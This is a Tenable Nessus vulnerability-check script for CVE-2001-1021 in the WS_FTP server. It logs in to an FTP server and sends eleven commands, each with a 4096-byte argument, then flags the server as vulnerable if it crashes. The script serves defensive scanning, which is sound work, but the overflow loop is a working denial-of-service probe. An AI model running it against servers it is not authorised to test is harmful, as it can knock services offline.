#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(11094);
 script_version ("$Revision: 1.15 $");
 script_cve_id("CVE-2001-1021");
 script_xref(name:"OSVDB", value:"14115");

 script_name(english:"WS_FTP Multiple Command Long Argument Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to crash the remote FTP server." );
 script_set_attribute(attribute:"description", value:
"It is possible to shut down the remote FTP server by issuing
a command followed by a too long argument.

An attacker may use this flow to prevent your site from 
sharing some resources with the rest of the world, or even
execute arbitrary code on your system." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version your FTP server." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );


script_end_attributes();

 
 summary["english"] = "Attempts a buffer overflow on many commands";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english:"FTP");
 script_dependencie("find_service1.nasl", "ftp_anonymous.nasl",
 		    "ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 
 exit(0);
}

#

include("global_settings.inc");
include ("ftp_func.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/ftp");
if(!port) port = 21;
if (! get_port_state(port)) exit(0);
if (get_kb_item('ftp/'+port+'/broken') || 
    get_kb_item('ftp/'+port+'/backdoor')) exit(0);

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

if(!login) login = "ftp";
if (! password) password = "test@nessus.org";

soc = open_sock_tcp(port);
if(! soc) exit(0);
if(! ftp_authenticate(socket:soc, user:login, pass:password))
{
  ftp_close(socket: soc);
  exit(0);
}

cmd[0] = "DELE";
cmd[1] = "MDTM";
cmd[2] = "MLST";
cmd[3] = "MKD";
cmd[4] = "RMD";
cmd[5] = "RNFR";
cmd[6] = "RNTO";
cmd[7] = "SIZE";
cmd[8] = "STAT";
cmd[9] = "XMKD";
cmd[10] = "XRMD ";

pb=0;
for (i=0; i<11; i=i+1)
{
  s = string(cmd[i], " /", crap(4096), "\r\n");
  send(socket:soc, data:s);
  r = recv_line(socket:soc, length:1024);
  #if(!r) pb=pb+1;
  ftp_close(socket: soc);
 
  soc = open_sock_tcp(port);
  if (! soc) { security_hole(port); exit(0); }
  ftp_authenticate(socket:soc, user:login, pass:password);
}

ftp_close(socket: soc);

